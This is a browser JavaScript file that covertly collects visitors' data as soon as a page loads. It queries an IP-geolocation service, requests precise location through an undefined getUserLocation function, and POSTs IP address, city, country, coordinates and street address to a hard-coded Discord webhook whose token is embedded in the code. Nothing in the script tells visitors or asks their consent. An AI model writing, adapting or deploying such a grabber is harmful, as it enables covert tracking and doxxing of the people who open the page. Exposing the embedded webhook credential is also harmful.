const WEBHOOK_URL = `https://discord.com/api/webhooks/1322770566771638343/V1GDsiPGYFhmneTpR8QfD5mYpsKfqfKZLXFfw6Y9pskVQruPvzy_s7XX_PLqbCm__Ovi`;
function sendToDiscord(ipData, locationData) {
  const ip = ipData.query;
  const city = ipData.city;
  const region = ipData.region;
  const country = ipData.country;
  const longitude = ipData.lon;
  const latitude = ipData.lat;

  let locationMessage = `Latitude: ${latitude} | Longitude: ${longitude}`;
  let addressMessage = "";

  if (locationData) {
    const { lat, lon, address } = locationData;
    locationMessage = `Latitude: ${lat} | Longitude: ${lon}`;
    addressMessage = `Address: ${address}`;
  }

  const message = `\`\`\`
IP Address: ${ip}
Location: ${city}, ${region}, ${country}
${locationMessage}
${addressMessage}
\`\`\``;

  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: message }),
  })
    .then((response) =>
      console.log(`Sent message to Discord with status ${response.status}`)
    )
    .catch((error) =>
      console.error(`Error sending message to Discord: ${error}`)
    );
}

function sendIPData() {
  fetch("https://ipapi.co/json")
    .then((response) => response.json())
    .then((ipData) => {
      getUserLocation(function (locationData) {
        sendToDiscord(ipData, locationData);
      });
    })
    .catch((error) => console.error(`Error retrieving IP data: ${error}`));
}

window.addEventListener("load", sendIPData);
